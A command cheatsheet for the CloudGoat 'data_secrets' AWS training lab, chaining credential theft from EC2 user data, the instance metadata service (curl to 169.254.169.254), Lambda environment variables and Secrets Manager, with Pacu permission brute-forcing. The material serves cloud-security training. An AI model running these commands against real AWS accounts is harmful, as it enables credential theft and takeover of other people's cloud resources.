# data_secrets — Cheatsheet

Bare commands for the CloudGoat `data_secrets` scenario. The path is a four-hop
credential chain:

`start_user` → EC2 box (SSH creds in user data) → EC2 role (via IMDS) →
DB user (creds in Lambda env vars) → final flag (Secrets Manager).

Resource names carry a per-deployment suffix; pull live values from each step's output.

```bash
# --- vars (fill as you go) ----------------------------------------------
REGION=us-east-1
INSTANCE_ID=<from describe-instances>
PUBLIC_IP=<from describe-instances>
EC2_ROLE=<from IMDS security-credentials/>
SECRET_NAME=<from list-secrets>
```

## 1. Foothold — start_user
```bash
aws configure --profile start_user          # paste the scenario's start keys
aws sts get-caller-identity --profile start_user
```

## 2. Enumerate permissions (Pacu)
```bash
pacu
# import_keys start_user           # or: set_keys
# run iam__enum_permissions        # try clean first
# run iam__bruteforce_permissions  # fallback — watch for ec2 describe_instances
```

## 3. EC2 recon — find the instance + read user data
```bash
aws ec2 describe-instances --region "$REGION" --profile start_user > instances.json
# note InstanceId, PublicIpAddress, attached IamInstanceProfile

aws ec2 describe-instance-attribute \
  --instance-id "$INSTANCE_ID" \
  --attribute userData \
  --region "$REGION" \
  --profile start_user
# UserData.Value is base64:
echo '<base64-blob>' | base64 -d        # bootstrap script -> ec2-user password + SSH on
```

## 4. SSH in, then steal the role creds from IMDS
```bash
ssh ec2-user@"$PUBLIC_IP"                # password from the decoded user data

# on the box (IMDSv1 / HttpTokens optional, so no token needed):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"$EC2_ROLE"
# returns AccessKeyId / SecretAccessKey / Token
```

## 5. Assume the EC2 role locally
```bash
aws configure --profile ec2role          # paste AccessKeyId, Secret, AND Session Token
aws sts get-caller-identity --profile ec2role
```

## 6. Pivot — the role can read Lambda (creds in env vars)
```bash
# pacu -> run iam__bruteforce_permissions   # lambda list_functions worked
aws lambda list-functions --profile ec2role > functions.json
# read Environment.Variables -> DB_USER_ACCESS_KEY / DB_USER_SECRET_KEY
```

## 7. Become the DB user
```bash
aws configure --profile db_user           # the DB_USER_* keys (no session token)
aws sts get-caller-identity --profile db_user
```

## 8. Pivot — the DB user can read Secrets Manager
```bash
# pacu -> run iam__bruteforce_permissions   # secretsmanager list_secrets worked
aws secretsmanager list-secrets --profile db_user           # note the secret Name
aws secretsmanager get-secret-value --secret-id "$SECRET_NAME" --profile db_user
```

## Teardown (always)
```bash
cloudgoat destroy data_secrets    # run inside the CloudGoat container
```
